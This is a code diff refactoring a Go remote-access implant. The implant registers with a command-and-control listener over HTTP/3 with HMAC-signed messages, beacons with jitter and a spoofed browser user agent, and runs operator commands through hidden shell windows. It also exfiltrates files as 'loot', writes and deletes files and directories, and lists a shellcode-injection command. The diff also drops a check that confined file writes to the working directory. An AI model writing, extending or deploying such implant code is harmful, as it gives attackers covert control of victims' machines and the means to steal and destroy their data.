@@ -32,7 +32,6 @@ import (
 
 // Build-time configuration - can be overridden with -ldflags during compilation
 var (
-	listenerProtocol     = "quic"
 	listenerHost         = "localhost"
 	listenerPort         = "8081"
 	listenerEndpoint     = "/wiki"
@@ -43,19 +42,28 @@ var (
 	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 )
 
-var reconnectInterval = 15
-var currentInterval = 15
-var jitterSeconds = 10
-var hmacKey = []byte(hmacKeyHex)
-var agentID = uuid.New().String()
-var currentCommandID int
-var http3Client = &http.Client{
-	Transport: &http3.RoundTripper{
-		TLSClientConfig: &tls.Config{
-			InsecureSkipVerify: true, // Skip certificate verification for self-signed certs
+// Global state
+var (
+	reconnectInterval = 15
+	currentInterval   = 15
+	jitterSeconds     = 10
+	hmacKey           = []byte(hmacKeyHex)
+	agentID           = uuid.New().String()
+	currentCommandID  int
+	http3Client       = &http.Client{
+		Transport: &http3.RoundTripper{
+			TLSClientConfig: &tls.Config{
+				InsecureSkipVerify: true, // Skip certificate verification for self-signed certs
+			},
 		},
-	},
-}
+	}
+)
+
+// Constants
+const (
+	chunkSize      = 2 * 1024 * 1024  // 2MB chunks for file transfers
+	chunkThreshold = 10 * 1024 * 1024 // 10MB threshold for chunked transfers
+)
 
 // sendHTTP3Request sends a request using HTTP3/QUIC
 func sendHTTP3Request(endpoint string, data []byte, headers map[string]string) ([]byte, error) {
@@ -96,18 +104,6 @@ func sendHTTP3Request(endpoint string, data []byte, headers map[string]string) (
 	}
 
 	return json.Marshal(response)
-}
-
-func listenerEndpointURL() string {
-	path := strings.TrimSpace(listenerEndpoint)
-	if path == "" || path == "/" {
-		return fmt.Sprintf("%s://%s:%s", listenerProtocol, listenerHost, listenerPort)
-	}
-	if !strings.HasPrefix(path, "/") {
-		path = "/" + path
-	}
-	path = strings.TrimRight(path, "/")
-	return fmt.Sprintf("%s://%s:%s%s", listenerProtocol, listenerHost, listenerPort, path)
 }
 
 // HMAC signing functions
@@ -169,6 +165,98 @@ type ProcessInfo struct {
 	Parent uint32
 }
 
+// Helper functions
+
+// wrapWithHMAC wraps data with HMAC signature
+func wrapWithHMAC(data interface{}) ([]byte, error) {
+	jsonData, err := json.Marshal(data)
+	if err != nil {
+		return nil, err
+	}
+
+	body := string(jsonData)
+	timestamp, signature := signRequest("POST", listenerEndpoint, body)
+
+	wrapper := map[string]interface{}{
+		"data":      json.RawMessage(jsonData),
+		"timestamp": timestamp,
+		"signature": signature,
+	}
+
+	return json.Marshal(wrapper)
+}
+
+// sendSignedRequest sends a signed HTTP3 request with custom headers
+func sendSignedRequest(data interface{}, customHeaders map[string]string) ([]byte, error) {
+	finalData, err := wrapWithHMAC(data)
+	if err != nil {
+		return nil, err
+	}
+
+	headers := map[string]string{"Content-Type": "application/json"}
+	for k, v := range customHeaders {
+		headers[k] = v
+	}
+
+	return sendHTTP3Request(listenerEndpoint, finalData, headers)
+}
+
+// parseHTTP3Response parses the HTTP3 response and extracts the body
+func parseHTTP3Response(respData []byte) (map[string]interface{}, error) {
+	var httpResponse map[string]interface{}
+	if err := json.Unmarshal(respData, &httpResponse); err != nil {
+		return nil, fmt.Errorf("invalid response format: %v", err)
+	}
+
+	statusCode, ok := httpResponse["status"].(float64)
+	if !ok || statusCode != 200 {
+		return nil, fmt.Errorf("request failed: status %v", statusCode)
+	}
+
+	bodyStr, ok := httpResponse["body"].(string)
+	if !ok {
+		return httpResponse, nil // Some responses don't have a body field
+	}
+
+	var result map[string]interface{}
+	if err := json.Unmarshal([]byte(bodyStr), &result); err != nil {
+		return nil, fmt.Errorf("failed to parse response body: %v", err)
+	}
+
+	return result, nil
+}
+
+// resolveFilePath resolves a file path relative to current directory
+func resolveFilePath(path string) (string, error) {
+	if filepath.IsAbs(path) {
+		return filepath.Abs(path)
+	}
+
+	currentDir, err := os.Getwd()
+	if err != nil {
+		return "", fmt.Errorf("failed to get current directory: %v", err)
+	}
+
+	return filepath.Abs(filepath.Join(currentDir, path))
+}
+
+// execSystemCommand executes a system command with proper platform handling
+func execSystemCommand(command string) (string, error) {
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/C", command)
+		cmd.SysProcAttr = &syscall.SysProcAttr{
+			HideWindow:    true,
+			CreationFlags: 0x08000000, // CREATE_NO_WINDOW
+		}
+	} else {
+		cmd = exec.Command("sh", "-c", command)
+	}
+
+	output, err := cmd.CombinedOutput()
+	return string(output), err
+}
+
 func main() {
 	if interval, err := strconv.Atoi(reconnectIntervalStr); err == nil && interval > 0 {
 		reconnectInterval = interval
@@ -215,51 +303,13 @@ func main() {
 }
 
 func registerAgent(reg AgentRegistration) error {
-	// Marshal the core registration data
-	jsonData, err := json.Marshal(reg)
+	respData, err := sendSignedRequest(reg, nil)
 	if err != nil {
 		return err
 	}
 
-	// HMAC goes in body, not headers
-	body := string(jsonData)
-	timestamp, signature := signRequest("POST", listenerEndpoint, body)
-
-	// Wrap the data with HMAC fields (using json.RawMessage to preserve exact bytes)
-	wrapper := map[string]interface{}{
-		"data":      json.RawMessage(jsonData),
-		"timestamp": timestamp,
-		"signature": signature,
-	}
-
-	// Marshal the wrapper
-	finalData, err := json.Marshal(wrapper)
-	if err != nil {
-		return err
-	}
-
-	// Create QUIC request with NO custom headers - just plain JSON!
-	headers := map[string]string{
-		"Content-Type": "application/json",
-	}
-
-	respData, err := sendHTTP3Request(listenerEndpoint, finalData, headers)
-	if err != nil {
-		return err
-	}
-
-	// Parse response
-	var regResponse map[string]interface{}
-	if err := json.Unmarshal(respData, &regResponse); err != nil {
-		return fmt.Errorf("invalid response format: %v", err)
-	}
-
-	statusCode, ok := regResponse["status"].(float64)
-	if !ok || statusCode != 200 {
-		return fmt.Errorf("registration failed with status: %v", statusCode)
-	}
-
-	return nil
+	_, err = parseHTTP3Response(respData)
+	return err
 }
 
 func getLocalIP() string {
@@ -339,69 +389,38 @@ func calculateIntervalWithJitter() int {
 }
 
 func getPendingCommands(agentID string) ([]Command, error) {
-	// Simple poll request (no GraphQL)
 	pollRequest := map[string]interface{}{
 		"agentId": agentID,
 	}
 
-	jsonData, err := json.Marshal(pollRequest)
+	respData, err := sendSignedRequest(pollRequest, nil)
 	if err != nil {
 		return nil, err
 	}
 
-	// HMAC goes in body, not headers
-	body := string(jsonData)
-	timestamp, signature := signRequest("POST", listenerEndpoint, body)
-
-	// Wrap the data with HMAC fields (using json.RawMessage to preserve exact bytes)
-	wrapper := map[string]interface{}{
-		"data":      json.RawMessage(jsonData),
-		"timestamp": timestamp,
-		"signature": signature,
-	}
-
-	// Marshal the wrapper
-	finalData, err := json.Marshal(wrapper)
+	result, err := parseHTTP3Response(respData)
 	if err != nil {
 		return nil, err
 	}
 
-	// Create QUIC request with NO custom headers - just plain JSON!
-	headers := map[string]string{
-		"Content-Type": "application/json",
-	}
-
-	respData, err := sendHTTP3Request(listenerEndpoint, finalData, headers)
-	if err != nil {
-		return nil, err
-	}
-
-	// Parse response
-	var httpResponse map[string]interface{}
-	if err := json.Unmarshal(respData, &httpResponse); err != nil {
-		return nil, fmt.Errorf("invalid response format: %v", err)
-	}
-
-	statusCode, ok := httpResponse["status"].(float64)
-	if !ok || statusCode != 200 {
-		return nil, fmt.Errorf("poll request failed: status %v", statusCode)
-	}
-
-	// Extract the body from the response
-	bodyStr, ok := httpResponse["body"].(string)
+	// Extract commands from the result
+	commandsData, ok := result["commands"]
 	if !ok {
-		return nil, fmt.Errorf("invalid response body format")
+		return []Command{}, nil
 	}
 
-	var result struct {
-		Commands []Command `json:"commands"`
-	}
-
-	if err := json.Unmarshal([]byte(bodyStr), &result); err != nil {
+	// Marshal and unmarshal to convert to []Command
+	commandsJSON, err := json.Marshal(commandsData)
+	if err != nil {
 		return nil, err
 	}
 
-	return result.Commands, nil
+	var commands []Command
+	if err := json.Unmarshal(commandsJSON, &commands); err != nil {
+		return nil, err
+	}
+
+	return commands, nil
 }
 
 func parseCommand(command string) []string {
@@ -745,37 +764,16 @@ func formatFileSize(size int64) string {
 	return fmt.Sprintf("%.1f%s", float64(size)/float64(div), units[exp])
 }
 
-const (
-	// Chunk size for file transfers (2MB)
-	chunkSize = 2 * 1024 * 1024
-	// Threshold for using chunked transfers (10MB)
-	chunkThreshold = 10 * 1024 * 1024
-)
-
 func handleGet(args []string) (string, error) {
 	if len(args) == 0 {
 		return "", fmt.Errorf("usage: get <filepath>")
 	}
 
-	filePath := args[0]
-
-	// Get current working directory
-	currentDir, err := os.Getwd()
+	absPath, err := resolveFilePath(args[0])
 	if err != nil {
-		return "", fmt.Errorf("failed to get current directory: %v", err)
+		return "", err
 	}
 
-	// Create absolute path by combining current directory with file path
-	var absPath string
-	if filepath.IsAbs(filePath) {
-		// Path is already absolute
-		absPath = filePath
-	} else {
-		// Path is relative, combine with current directory
-		absPath = filepath.Join(currentDir, filePath)
-	}
-
-	// Get file info to check size
 	fileInfo, err := os.Stat(absPath)
 	if err != nil {
 		return "", fmt.Errorf("failed to get file info: %v", err)
@@ -784,12 +782,10 @@ func handleGet(args []string) (string, error) {
 	filename := filepath.Base(absPath)
 	fileSize := fileInfo.Size()
 
-	// If file is small (<10MB), use old method for simplicity
 	if fileSize < chunkThreshold {
 		return handleGetSmallFile(absPath, filename)
 	}
 
-	// Use chunked transfer for large files
 	return handleGetChunkedFile(absPath, filename, fileSize)
 }
 
@@ -885,55 +881,19 @@ func initiateChunkedTransfer(absPath, filename string, fileSize int64, totalChun
 		"expectedMd5":  expectedMD5,
 	}
 
-	jsonData, err := json.Marshal(initReq)
+	respData, err := sendSignedRequest(initReq, nil)
 	if err != nil {
 		return "", err
 	}
 
-	// Sign and wrap request
-	body := string(jsonData)
-	timestamp, signature := signRequest("POST", listenerEndpoint, body)
-
-	wrapper := map[string]interface{}{
-		"data":      json.RawMessage(jsonData),
-		"timestamp": timestamp,
-		"signature": signature,
-	}
-
-	finalData, err := json.Marshal(wrapper)
+	response, err := parseHTTP3Response(respData)
 	if err != nil {
 		return "", err
-	}
-
-	headers := map[string]string{
-		"Content-Type": "application/json",
-	}
-
-	respData, err := sendHTTP3Request(listenerEndpoint, finalData, headers)
-	if err != nil {
-		return "", err
-	}
-
-	// Parse outer response wrapper (from sendHTTP3Request)
-	var respWrapper map[string]interface{}
-	if err := json.Unmarshal(respData, &respWrapper); err != nil {
-		return "", fmt.Errorf("failed to parse response wrapper: %v", err)
-	}
-
-	// Extract the body string and parse it
-	bodyStr, ok := respWrapper["body"].(string)
-	if !ok {
-		return "", fmt.Errorf("invalid response format - body missing. Response: %+v", respWrapper)
-	}
-
-	var response map[string]interface{}
-	if err := json.Unmarshal([]byte(bodyStr), &response); err != nil {
-		return "", fmt.Errorf("failed to parse response body: %v. Body: %s", err, bodyStr)
 	}
 
 	sessionID, ok := response["sessionId"].(string)
 	if !ok {
-		return "", fmt.Errorf("no session ID in response. Response: %+v", response)
+		return "", fmt.Errorf("no session ID in response")
 	}
 
 	return sessionID, nil
@@ -948,58 +908,13 @@ func uploadChunk(sessionID string, chunkIndex int, chunkData []byte, chunkMD5 st
 		"chunkMd5":   chunkMD5,
 	}
 
-	jsonData, err := json.Marshal(chunkReq)
+	respData, err := sendSignedRequest(chunkReq, nil)
 	if err != nil {
 		return err
 	}
 
-	// Sign and wrap request
-	body := string(jsonData)
-	timestamp, signature := signRequest("POST", listenerEndpoint, body)
-
-	wrapper := map[string]interface{}{
-		"data":      json.RawMessage(jsonData),
-		"timestamp": timestamp,
-		"signature": signature,
-	}
-
-	finalData, err := json.Marshal(wrapper)
-	if err != nil {
-		return err
-	}
-
-	headers := map[string]string{
-		"Content-Type": "application/json",
-	}
-
-	respData, err := sendHTTP3Request(listenerEndpoint, finalData, headers)
-	if err != nil {
-		return err
-	}
-
-	// Parse outer response wrapper (from sendHTTP3Request)
-	var respWrapper map[string]interface{}
-	if err := json.Unmarshal(respData, &respWrapper); err != nil {
-		return err
-	}
-
-	// Extract the body string and parse it
-	bodyStr, ok := respWrapper["body"].(string)
-	if !ok {
-		return fmt.Errorf("invalid response format")
-	}
-
-	var response map[string]interface{}
-	if err := json.Unmarshal([]byte(bodyStr), &response); err != nil {
-		return err
-	}
-
-	status, _ := response["status"].(float64)
-	if status != 200 {
-		return fmt.Errorf("server returned status %v", status)
-	}
-
-	return nil
+	_, err = parseHTTP3Response(respData)
+	return err
 }
 
 // completeChunkedTransfer signals the server to assemble and finalize the transfer
@@ -1009,58 +924,13 @@ func completeChunkedTransfer(sessionID string) error {
 		"complete":  true,
 	}
 
-	jsonData, err := json.Marshal(completeReq)
+	respData, err := sendSignedRequest(completeReq, nil)
 	if err != nil {
 		return err
 	}
 
-	// Sign and wrap request
-	body := string(jsonData)
-	timestamp, signature := signRequest("POST", listenerEndpoint, body)
-
-	wrapper := map[string]interface{}{
-		"data":      json.RawMessage(jsonData),
-		"timestamp": timestamp,
-		"signature": signature,
-	}
-
-	finalData, err := json.Marshal(wrapper)
-	if err != nil {
-		return err
-	}
-
-	headers := map[string]string{
-		"Content-Type": "application/json",
-	}
-
-	respData, err := sendHTTP3Request(listenerEndpoint, finalData, headers)
-	if err != nil {
-		return err
-	}
-
-	// Parse outer response wrapper (from sendHTTP3Request)
-	var respWrapper map[string]interface{}
-	if err := json.Unmarshal(respData, &respWrapper); err != nil {
-		return err
-	}
-
-	// Extract the body string and parse it
-	bodyStr, ok := respWrapper["body"].(string)
-	if !ok {
-		return fmt.Errorf("invalid response format")
-	}
-
-	var response map[string]interface{}
-	if err := json.Unmarshal([]byte(bodyStr), &response); err != nil {
-		return err
-	}
-
-	status, _ := response["status"].(float64)
-	if status != 200 {
-		return fmt.Errorf("server returned status %v", status)
-	}
-
-	return nil
+	_, err = parseHTTP3Response(respData)
+	return err
 }
 
 func handlePut(args []string) (string, error) {
@@ -1068,64 +938,30 @@ func handlePut(args []string) (string, error) {
 		return "", fmt.Errorf("usage: put <remote_filepath> <hex_data>")
 	}
 
-	// Remove quotes from path if present
-	remoteFilePath := args[0]
-	if strings.HasPrefix(remoteFilePath, "\"") && strings.HasSuffix(remoteFilePath, "\"") {
-		remoteFilePath = remoteFilePath[1 : len(remoteFilePath)-1]
-	}
+	// Remove quotes if present
+	remoteFilePath := strings.Trim(args[0], "\"")
+	hexData := strings.Trim(args[1], "\"")
 
-	// Remove quotes from hex data if present
-	hexData := args[1]
-	if strings.HasPrefix(hexData, "\"") && strings.HasSuffix(hexData, "\"") {
-		hexData = hexData[1 : len(hexData)-1]
-	}
-
-	// Validate hex data
+	// Validate and decode hex data
 	if len(hexData) == 0 {
 		return "", fmt.Errorf("empty hex data provided")
 	}
-
-	// Check if hex data is valid (even length)
 	if len(hexData)%2 != 0 {
 		return "", fmt.Errorf("invalid hex data: odd length")
 	}
 
-	// Decode hex data to bytes
 	fileData, err := hex.DecodeString(hexData)
 	if err != nil {
 		return "", fmt.Errorf("failed to decode hex data: %v", err)
 	}
-
-	// Validate decoded data
 	if len(fileData) == 0 {
 		return "", fmt.Errorf("decoded file data is empty")
 	}
 
-	// Get current working directory
-	currentDir, err := os.Getwd()
+	// Resolve file path
+	cleanPath, err := resolveFilePath(remoteFilePath)
 	if err != nil {
-		return "", fmt.Errorf("failed to get current directory: %v", err)
-	}
-
-	// Create absolute path by combining current directory with remote file path
-	var absPath string
-	if filepath.IsAbs(remoteFilePath) {
-		// Path is already absolute
-		absPath = remoteFilePath
-	} else {
-		// Path is relative, combine with current directory
-		absPath = filepath.Join(currentDir, remoteFilePath)
-	}
-
-	// Validate the path to prevent directory traversal attacks
-	cleanPath, err := filepath.Abs(absPath)
-	if err != nil {
-		return "", fmt.Errorf("invalid file path: %v", err)
-	}
-
-	// Ensure the path is within the current directory (basic security check)
-	if !strings.HasPrefix(cleanPath, currentDir) {
-		return "", fmt.Errorf("file path outside current directory not allowed")
+		return "", err
 	}
 
 	// Create directory if it doesn't exist
@@ -1139,14 +975,11 @@ func handlePut(args []string) (string, error) {
 		return "", fmt.Errorf("failed to write file: %v", err)
 	}
 
-	// Get just the filename for the clean message
+	// Create loot entry
 	filename := filepath.Base(cleanPath)
-
-	// Calculate MD5 hash
 	hash := md5.Sum(fileData)
 	hashString := hex.EncodeToString(hash[:])
 
-	// Create loot entry for the uploaded file
 	lootEntry := map[string]interface{}{
 		"type":    "file",
 		"name":    filename,
@@ -1156,13 +989,11 @@ func handlePut(args []string) (string, error) {
 		"md5":     hashString,
 	}
 
-	// Convert to JSON
 	lootJSON, err := json.Marshal([]map[string]interface{}{lootEntry})
 	if err != nil {
 		return "", fmt.Errorf("failed to marshal loot entry: %v", err)
 	}
 
-	// Return clean message with loot entry embedded
 	return fmt.Sprintf("put %s!\nLOOT_ENTRIES:%s", filename, string(lootJSON)), nil
 }
 
@@ -1267,51 +1098,13 @@ func getProcessList() ([]ProcessInfo, error) {
 	return processes, nil
 }
 
-func decodeCommand(command string) string {
-	commandMap := map[string]string{
-		"1":  "ls",
-		"2":  "get",
-		"3":  "put",
-		"4":  "cd",
-		"5":  "kill",
-		"6":  "ps",
-		"7":  "exec",
-		"8":  "reconnect",
-		"9":  "injectsc",
-		"10": "rm",
-		"11": "rmdir",
-		"12": "jitter",
-	}
-
-	spaceIdx := strings.IndexAny(command, " \t")
-	var cmdID string
-	var rest string
-	
-	if spaceIdx == -1 {
-		cmdID = command
-		rest = ""
-	} else {
-		cmdID = command[:spaceIdx]
-		rest = command[spaceIdx:]
-	}
-
-	if cmdName, ok := commandMap[cmdID]; ok {
-		return cmdName + rest
-	}
-
-	return command
-}
-
 func executeCommand(command string) (string, error) {
 	if command == "" {
 		return "", fmt.Errorf("empty command")
 	}
 
-	// Decode command ID to command name (if encoded)
-	decodedCommand := decodeCommand(command)
-
 	// Check if it's a builtin command first
-	output, err := handleBuiltinCommand(decodedCommand)
+	output, err := handleBuiltinCommand(command)
 	if err == nil {
 		return output, nil
 	}
@@ -1322,66 +1115,17 @@ func executeCommand(command string) (string, error) {
 	}
 
 	// Handle direct cmd.exe execution
-	if strings.HasPrefix(strings.ToLower(decodedCommand), "cmd.exe") {
-		return executeCmdDirect(decodedCommand)
+	if strings.HasPrefix(strings.ToLower(command), "cmd.exe") {
+		return executeCmdDirect(command)
 	}
 
-	// Use system() for full command execution (supports pipes, redirects, etc.)
-	// Cross-platform command execution
-	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/C", decodedCommand)
-		// Hide console window on Windows
-		cmd.SysProcAttr = &syscall.SysProcAttr{
-			HideWindow:    true,
-			CreationFlags: 0x08000000, // CREATE_NO_WINDOW
-		}
-	} else {
-		cmd = exec.Command("sh", "-c", decodedCommand)
-	}
-
-	systemOutput, err := cmd.CombinedOutput()
-	if err != nil {
-		return string(systemOutput), err
-	}
-
-	return string(systemOutput), nil
+	// Use system command execution for everything else
+	return execSystemCommand(command)
 }
 
 // executeCmdDirect handles direct cmd.exe execution
 func executeCmdDirect(command string) (string, error) {
-	// Parse the command to extract arguments
-	parts := strings.Fields(command)
-
-	if len(parts) == 1 {
-		// Just "cmd.exe" - start interactive shell
-		cmd := exec.Command("cmd.exe")
-		// Hide console window on Windows
-		cmd.SysProcAttr = &syscall.SysProcAttr{
-			HideWindow:    true,
-			CreationFlags: 0x08000000, // CREATE_NO_WINDOW
-		}
-		output, err := cmd.CombinedOutput()
-		if err != nil {
-			return string(output), err
-		}
-		return string(output), nil
-	}
-
-	// cmd.exe with arguments
-	args := parts[1:]
-	cmd := exec.Command("cmd.exe", args...)
-	// Hide console window on Windows
-	cmd.SysProcAttr = &syscall.SysProcAttr{
-		HideWindow:    true,
-		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
-	}
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		return string(output), err
-	}
-
-	return string(output), nil
+	return execSystemCommand(command)
 }
 
 // handleExec executes system commands
@@ -1390,28 +1134,7 @@ func handleExec(args []string) (string, error) {
 		return "", fmt.Errorf("usage: exec <command>")
 	}
 
-	// Join all arguments into a single command string
-	command := strings.Join(args, " ")
-
-	// Execute the command using the system shell
-	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/C", command)
-		// Hide console window on Windows
-		cmd.SysProcAttr = &syscall.SysProcAttr{
-			HideWindow:    true,
-			CreationFlags: 0x08000000, // CREATE_NO_WINDOW
-		}
-	} else {
-		cmd = exec.Command("sh", "-c", command)
-	}
-
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		return string(output), err
-	}
-
-	return string(output), nil
+	return execSystemCommand(strings.Join(args, " "))
 }
 
 // handleReconnect changes the reconnection interval
@@ -1447,34 +1170,20 @@ func handleRm(args []string) (string, error) {
 		return "", fmt.Errorf("usage: rm <filepath>")
 	}
 
-	filePath := args[0]
-
-	// Get current working directory
-	currentDir, err := os.Getwd()
+	absPath, err := resolveFilePath(args[0])
 	if err != nil {
-		return "", fmt.Errorf("failed to get current directory: %v", err)
+		return "", err
 	}
 
-	// Create absolute path
-	var absPath string
-	if filepath.IsAbs(filePath) {
-		absPath = filePath
-	} else {
-		absPath = filepath.Join(currentDir, filePath)
-	}
-
-	// Check if path exists
 	info, err := os.Stat(absPath)
 	if err != nil {
 		return "", fmt.Errorf("file not found: %v", err)
 	}
 
-	// Make sure it's not a directory
 	if info.IsDir() {
 		return "", fmt.Errorf("cannot remove directory with rm (use rmdir): %s", absPath)
 	}
 
-	// Remove the file
 	if err := os.Remove(absPath); err != nil {
 		return "", fmt.Errorf("failed to remove file: %v", err)
 	}
@@ -1488,34 +1197,20 @@ func handleRmdir(args []string) (string, error) {
 		return "", fmt.Errorf("usage: rmdir <dirpath>")
 	}
 
-	dirPath := args[0]
-
-	// Get current working directory
-	currentDir, err := os.Getwd()
+	absPath, err := resolveFilePath(args[0])
 	if err != nil {
-		return "", fmt.Errorf("failed to get current directory: %v", err)
+		return "", err
 	}
 
-	// Create absolute path
-	var absPath string
-	if filepath.IsAbs(dirPath) {
-		absPath = dirPath
-	} else {
-		absPath = filepath.Join(currentDir, dirPath)
-	}
-
-	// Check if path exists
 	info, err := os.Stat(absPath)
 	if err != nil {
 		return "", fmt.Errorf("directory not found: %v", err)
 	}
 
-	// Make sure it's a directory
 	if !info.IsDir() {
 		return "", fmt.Errorf("not a directory (use rm for files): %s", absPath)
 	}
 
-	// Remove the directory and all contents
 	if err := os.RemoveAll(absPath); err != nil {
 		return "", fmt.Errorf("failed to remove directory: %v", err)
 	}
@@ -1557,59 +1252,17 @@ func sendCommandResponse(commandID int, output, status string) error {
 		Status:    status,
 	}
 
-	jsonData, err := json.Marshal(response)
-	if err != nil {
-		return err
-	}
-
-	// HMAC goes in body, not headers
-	body := string(jsonData)
-	timestamp, signature := signRequest("POST", listenerEndpoint, body)
-
-	// Wrap the data with HMAC fields (using json.RawMessage to preserve exact bytes)
-	wrapper := map[string]interface{}{
-		"data":      json.RawMessage(jsonData),
-		"timestamp": timestamp,
-		"signature": signature,
-	}
-
-	// Marshal the wrapper
-	finalData, err := json.Marshal(wrapper)
-	if err != nil {
-		return err
-	}
-
-	// Create QUIC request with NO custom headers - just plain JSON!
-	headers := map[string]string{
-		"Content-Type": "application/json",
-	}
-
-	// Check if this is a file response (contains "got" and LOOT_ENTRIES)
-	if strings.Contains(output, "got") && strings.Contains(output, "LOOT_ENTRIES:") {
-		headers["type"] = "loot"
-	}
-
-	// Check if this response contains loot entries (from ls command)
+	// Add loot type header if output contains loot entries
+	var headers map[string]string
 	if strings.Contains(output, "LOOT_ENTRIES:") {
-		headers["type"] = "loot"
+		headers = map[string]string{"type": "loot"}
 	}
 
-	respData, err := sendHTTP3Request(listenerEndpoint, finalData, headers)
+	respData, err := sendSignedRequest(response, headers)
 	if err != nil {
 		return err
 	}
 
-	// Parse response
-	var cmdResponse map[string]interface{}
-	if err := json.Unmarshal(respData, &cmdResponse); err != nil {
-		return fmt.Errorf("invalid response format: %v", err)
-	}
-
-	statusCode, ok := cmdResponse["status"].(float64)
-	if !ok || statusCode != 200 {
-		body, _ := json.Marshal(cmdResponse)
-		return fmt.Errorf("command response failed: status %v, body: %s", statusCode, string(body))
-	}
-
-	return nil
+	_, err = parseHTTP3Response(respData)
+	return err
 }
